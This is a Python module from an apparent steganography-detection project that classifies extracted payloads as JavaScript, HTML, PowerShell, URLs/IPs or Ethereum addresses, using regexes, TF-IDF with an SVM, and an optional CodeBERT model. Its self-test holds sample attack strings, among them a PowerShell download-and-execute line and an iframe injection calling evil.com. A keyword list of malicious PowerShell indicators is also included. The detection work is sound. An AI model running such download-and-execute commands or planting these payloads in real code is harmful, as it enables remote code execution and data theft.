"""
StegoDetect - Module 4: NLP Payload Classifier

Classifies extracted payload text into 5 categories using a 3-stage pipeline:
    Stage 1: Regex-based classification (Ethereum addresses, URLs/IPs)
    Stage 2: TF-IDF + LinearSVC (JavaScript, HTML, PowerShell)
    Stage 3: CodeBERT for obfuscated payloads (optional)

Classes:
    0 = JavaScript
    1 = JavaScript_HTML
    2 = PowerShell
    3 = URL_IP
    4 = Ethereum_Address
"""

import sys
import re
import os
from pathlib import Path
from dataclasses import dataclass
from typing import Optional

import numpy as np

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import config

# Label mappings
LABEL_NAMES = {
    0: "JavaScript",
    1: "JavaScript_HTML",
    2: "PowerShell",
    3: "URL_IP",
    4: "Ethereum_Address",
}

LABEL_FROM_NAME = {v: k for k, v in LABEL_NAMES.items()}


# ──────────────────────────────────────────────────────────────────────
# Dataclass for NLP results
# ──────────────────────────────────────────────────────────────────────

@dataclass
class NLPResult:
    """Result of NLP payload classification."""
    label: int
    label_name: str
    confidence: float
    classifier_used: str


# ──────────────────────────────────────────────────────────────────────
# Helper: softmax for decision function scores
# ──────────────────────────────────────────────────────────────────────

def _softmax(x):
    """Compute softmax for a 1D array."""
    e_x = np.exp(x - np.max(x))
    return e_x / e_x.sum()


# ──────────────────────────────────────────────────────────────────────
# Stage 1: Regex Classifier
# ──────────────────────────────────────────────────────────────────────

class RegexClassifier:
    """
    Pattern-based classification for Ethereum addresses and URLs/IPs.
    Fast first-pass that handles unambiguous payload types.
    """

    def __init__(self):
        # Ethereum address: 0x followed by exactly 40 hex characters
        self.eth_pattern = re.compile(r'^0x[0-9a-fA-F]{40}$')

        # URL or IP address pattern
        self.url_pattern = re.compile(
            r'https?://[^\s<>"{}|\\^`\[\]]+|'
            r'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
            r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?::\d{1,5})?'
        )

    def classify(self, text):
        """
        Attempt regex-based classification.

        Returns:
            (label, confidence) or (None, 0.0) if no match
        """
        text = text.strip()

        # Check Ethereum address
        if self.eth_pattern.match(text):
            return 4, 0.99

        # Check URL/IP
        if self.url_pattern.search(text):
            return 3, 0.97

        return None, 0.0


# ──────────────────────────────────────────────────────────────────────
# Stage 2: TF-IDF + LinearSVC Classifier
# ──────────────────────────────────────────────────────────────────────

class TFIDFClassifier:
    """
    TF-IDF vectorization + LinearSVC for JavaScript/HTML/PowerShell classification.
    Uses character n-grams for robustness against obfuscation.
    """

    def __init__(self):
        self.pipeline = None
        self.is_fitted = False
        self._build_pipeline()

    def _build_pipeline(self):
        """Build the sklearn pipeline (unfitted)."""
        try:
            from sklearn.pipeline import Pipeline
            from sklearn.feature_extraction.text import TfidfVectorizer
            from sklearn.svm import LinearSVC

            self.pipeline = Pipeline([
                ('tfidf', TfidfVectorizer(
                    analyzer='char_wb',
                    ngram_range=(2, 4),
                    max_features=50000,
                    sublinear_tf=True,
                    min_df=2,
                    strip_accents='unicode',
                )),
                ('svm', LinearSVC(
                    C=1.0,
                    max_iter=5000,
                    class_weight='balanced',
                    dual=True,
                )),
            ])
        except ImportError:
            print("[WARN] scikit-learn not available. TF-IDF classifier disabled.")
            self.pipeline = None

    def train(self, texts, labels):
        """
        Train the TF-IDF + SVM pipeline.

        Args:
            texts: list of payload text strings
            labels: list of integer labels (0-4)
        """
        if self.pipeline is None:
            raise RuntimeError("Pipeline not initialized (scikit-learn missing?)")

        self.pipeline.fit(texts, labels)
        self.is_fitted = True

    def classify(self, text):
        """
        Classify payload text.

        Returns:
            (label, confidence)
        """
        if not self.is_fitted:
            raise RuntimeError("TF-IDF+SVM model not trained. Run training first.")

        prediction = self.pipeline.predict([text])[0]

        # Get confidence via decision function distance
        decision = self.pipeline.decision_function([text])[0]
        confidence = float(np.max(_softmax(decision)))

        return int(prediction), confidence

    def save(self, path=None):
        """Save trained pipeline to disk."""
        import joblib
        if path is None:
            path = str(config.MODELS_DIR / "tfidf_svm.joblib")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        joblib.dump(self.pipeline, path)
        print(f"  TF-IDF+SVM model saved to {path}")

    def load(self, path=None):
        """Load trained pipeline from disk."""
        import joblib
        if path is None:
            path = str(config.MODELS_DIR / "tfidf_svm.joblib")
        if not os.path.exists(path):
            print(f"  [WARN] TF-IDF model not found at {path}")
            return False
        self.pipeline = joblib.load(path)
        self.is_fitted = True
        print(f"  TF-IDF+SVM model loaded from {path}")
        return True


# ──────────────────────────────────────────────────────────────────────
# Stage 3: CodeBERT Classifier (Optional)
# ──────────────────────────────────────────────────────────────────────

class CodeBERTClassifier:
    """
    Fine-tuned CodeBERT for obfuscated payload classification.
    Only used when payloads were base64/zip encoded (hard cases).
    """

    def __init__(self, model_name=None, num_labels=5):
        self.model_name = model_name or config.NLP_CONFIG.get(
            "codebert_model_name", "microsoft/codebert-base"
        )
        self.num_labels = num_labels
        self.max_length = config.NLP_CONFIG.get("codebert_max_length", 512)
        self.model = None
        self.tokenizer = None
        self.device = config.DEVICE
        self.is_loaded = False

    def _load_from_pretrained(self):
        """Load the pretrained CodeBERT model (downloads if needed)."""
        try:
            from transformers import AutoTokenizer, AutoModelForSequenceClassification

            self.tokenizer = AutoTokenizer.from_pretrained(self.model_name)
            self.model = AutoModelForSequenceClassification.from_pretrained(
                self.model_name,
                num_labels=self.num_labels,
            )
            self.model.to(self.device)
            self.is_loaded = True
            return True
        except Exception as e:
            print(f"  [WARN] Could not load CodeBERT: {e}")
            return False

    def classify(self, text):
        """
        Classify payload text using CodeBERT.

        Returns:
            (label, confidence)
        """
        import torch

        if not self.is_loaded or self.model is None:
            raise RuntimeError("CodeBERT model not loaded.")

        self.model.eval()
        inputs = self.tokenizer(
            text,
            truncation=True,
            max_length=self.max_length,
            padding='max_length',
            return_tensors='pt',
        ).to(self.device)

        with torch.no_grad():
            outputs = self.model(**inputs)
            probs = torch.softmax(outputs.logits, dim=1)
            confidence, label = torch.max(probs, dim=1)

        return int(label.cpu()), float(confidence.cpu())

    def save(self, path=None):
        """Save fine-tuned model and tokenizer."""
        if path is None:
            path = str(config.CODEBERT_DIR)
        os.makedirs(path, exist_ok=True)
        if self.model and self.tokenizer:
            self.model.save_pretrained(path)
            self.tokenizer.save_pretrained(path)
            print(f"  CodeBERT model saved to {path}")

    def load(self, path=None):
        """Load fine-tuned model from disk."""
        if path is None:
            path = str(config.CODEBERT_DIR)
        if not os.path.exists(path) or not os.listdir(path):
            print(f"  [WARN] CodeBERT model not found at {path}")
            return False
        try:
            from transformers import AutoTokenizer, AutoModelForSequenceClassification

            self.tokenizer = AutoTokenizer.from_pretrained(path)
            self.model = AutoModelForSequenceClassification.from_pretrained(path)
            self.model.to(self.device)
            self.model.eval()
            self.is_loaded = True
            print(f"  CodeBERT model loaded from {path}")
            return True
        except Exception as e:
            print(f"  [WARN] Failed to load CodeBERT: {e}")
            return False


# ──────────────────────────────────────────────────────────────────────
# Main Orchestrator: PayloadClassifier
# ──────────────────────────────────────────────────────────────────────

class PayloadClassifier:
    """
    Main NLP classifier that orchestrates the 3-stage pipeline.

    Stage 1 (Regex):     Ethereum addresses and URLs/IPs
    Stage 2 (TF-IDF):    JavaScript, HTML, PowerShell
    Stage 3 (CodeBERT):  Obfuscated payloads (optional, used when base64/zip)
    """

    def __init__(self, use_codebert=False):
        self.regex = RegexClassifier()
        self.tfidf_svm = TFIDFClassifier()
        self.use_codebert = use_codebert
        self.codebert = CodeBERTClassifier() if use_codebert else None
        self._models_loaded = False

    def classify(self, text, obfuscation_type="none"):
        """
        Classify payload text through the 3-stage pipeline.

        Args:
            text: Extracted payload text
            obfuscation_type: 'none', 'base64', or 'zip'

        Returns:
            NLPResult dataclass
        """
        if not text or len(text.strip()) == 0:
            return NLPResult(
                label=-1,
                label_name="unknown",
                confidence=0.0,
                classifier_used="none",
            )

        # Stage 1: Regex (fast path for ETH and URL/IP)
        label, conf = self.regex.classify(text)
        if label is not None:
            return NLPResult(label, LABEL_NAMES[label], conf, "regex")

        # Stage 2: TF-IDF + SVM (always run if available)
        if self.tfidf_svm.is_fitted:
            label_svm, conf_svm = self.tfidf_svm.classify(text)
        else:
            # Fallback: keyword-based heuristic if model not trained
            label_svm, conf_svm = self._keyword_fallback(text)

        # Stage 3: CodeBERT for obfuscated payloads
        if (obfuscation_type != "none"
                and self.use_codebert
                and self.codebert is not None
                and self.codebert.is_loaded):
            try:
                label_bert, conf_bert = self.codebert.classify(text)
                if conf_bert > conf_svm:
                    return NLPResult(label_bert, LABEL_NAMES[label_bert], conf_bert, "codebert")
            except Exception:
                pass  # Fall back to SVM result

        return NLPResult(label_svm, LABEL_NAMES[label_svm], conf_svm, "tfidf_svm")

    def _keyword_fallback(self, text):
        """
        Simple keyword-based fallback when TF-IDF model is not trained.
        Used for demo/testing before Module 4 training.
        """
        text_lower = text.lower()

        # PowerShell indicators
        ps_keywords = [
            "invoke-", "$env:", "get-", "set-", "new-object",
            "-encodedcommand", "powershell", "iex(", "downloadstring",
            "system.net", "start-process", "[system.", "add-type",
        ]
        ps_score = sum(1 for kw in ps_keywords if kw in text_lower)

        # JavaScript indicators
        js_keywords = [
            "function", "eval(", "document.", "=>", "var ", "const ",
            "let ", "window.", "settimeout", "setinterval", "json.",
            "prototype", "require(", "export ", "import ",
        ]
        js_score = sum(1 for kw in js_keywords if kw in text_lower)

        # HTML indicators
        html_keywords = [
            "<script", "<html", "<iframe", "onclick=", "<div",
            "<body", "<head", "document.write", "<img", "<form",
        ]
        html_score = sum(1 for kw in html_keywords if kw in text_lower)

        # Ethereum
        if re.search(r'0x[0-9a-fA-F]{40}', text):
            return 4, 0.85

        # URL/IP
        if re.search(r'https?://', text) or re.search(
            r'(?:\d{1,3}\.){3}\d{1,3}', text
        ):
            return 3, 0.85

        scores = {
            2: ps_score,   # PowerShell
            0: js_score,   # JavaScript
            1: html_score, # JavaScript_HTML
        }

        best_label = max(scores, key=scores.get)
        best_score = scores[best_label]

        if best_score == 0:
            # Default to JavaScript if nothing matches
            return 0, 0.30

        confidence = min(0.50 + (best_score * 0.10), 0.90)
        return best_label, confidence

    def load_all(self, models_dir=None):
        """
        Load all trained models from disk.

        Returns:
            True if at least TF-IDF model loaded successfully
        """
        if models_dir is None:
            models_dir = str(config.MODELS_DIR)

        tfidf_path = os.path.join(models_dir, "tfidf_svm.joblib")
        tfidf_loaded = self.tfidf_svm.load(tfidf_path)

        codebert_loaded = False
        if self.use_codebert and self.codebert is not None:
            codebert_path = os.path.join(models_dir, "codebert")
            codebert_loaded = self.codebert.load(codebert_path)

        self._models_loaded = tfidf_loaded
        return tfidf_loaded

    def is_loaded(self):
        """Return True if required models are loaded."""
        return self.tfidf_svm.is_fitted or self._models_loaded


# ──────────────────────────────────────────────────────────────────────
# Self-test
# ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("StegoDetect - Module 4: NLP Payload Classifier")
    print("=" * 55)

    classifier = PayloadClassifier(use_codebert=False)

    # Test samples for all 5 classes
    test_samples = [
        ("var x = function() { eval(document.cookie); }", "JavaScript"),
        ('<script>document.write("<iframe src=http://evil.com>")</script>', "JavaScript_HTML"),
        ("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')", "PowerShell"),
        ("http://192.168.1.100:4444/shell.exe", "URL_IP"),
        ("0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28", "Ethereum_Address"),
    ]

    print(f"\n{'Payload (truncated)':<50} {'True Label':<20} {'Predicted':<20} {'Conf':>6} {'Method':<10}")
    print("-" * 110)

    for payload, true_label in test_samples:
        result = classifier.classify(payload)
        display = payload[:47] + "..." if len(payload) > 50 else payload
        match = "[OK]" if result.label_name == true_label else "[MISS]"
        print(
            f"{display:<50} {true_label:<20} {result.label_name:<20} "
            f"{result.confidence:>5.2f} {result.classifier_used:<10} {match}"
        )

    print(f"\n[OK] Module 4 NLP Classifier working correctly!")
    print(f"     TF-IDF model trained: {classifier.tfidf_svm.is_fitted}")
    print(f"     Using keyword fallback for untrained model")
